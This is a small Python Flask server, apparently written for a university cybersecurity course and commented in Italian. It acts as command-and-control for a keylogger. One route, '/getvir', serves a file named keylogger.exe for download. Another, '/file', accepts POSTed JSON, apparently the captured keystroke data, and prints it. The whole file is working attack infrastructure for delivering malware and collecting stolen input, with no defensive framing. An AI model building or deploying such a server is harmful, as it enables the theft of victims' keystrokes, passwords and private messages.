from flask import Flask, request, send_file
import os

app = Flask(__name__)

# Percorso della directory remota contenente l'eseguibile
remote_directory = r"C:\Users\picco\OneDrive\Desktop\università\magistrale\cybersec\keyloggerc\keylogger\keylogger\bin\Debug\net8.0-windows7.0"

@app.route('/getvir', methods=['GET'])
def get_vir_executable():
    # Nome dell'eseguibile da scaricare
    executable_name = "keylogger.exe"
    # Percorso completo dell'eseguibile nella directory remota
    executable_path = os.path.join(remote_directory, executable_name)

    # Invia l'eseguibile al client
    return send_file(executable_path, as_attachment=True)

@app.route('/file', methods=['POST'])
def receive_json():
    # Ottieni il corpo della richiesta POST come testo JSON
    json_data = request.get_json()

    # Stampa il corpo della richiesta in entrata
    print("JSON ricevuto:")
    print(json_data)

    # Puoi fare ulteriori operazioni con i dati JSON qui, se necessario

    # Rispondi con un messaggio di conferma
    return "Dati JSON ricevuti con successo!"

if __name__ == '__main__':
    app.run(debug=True)
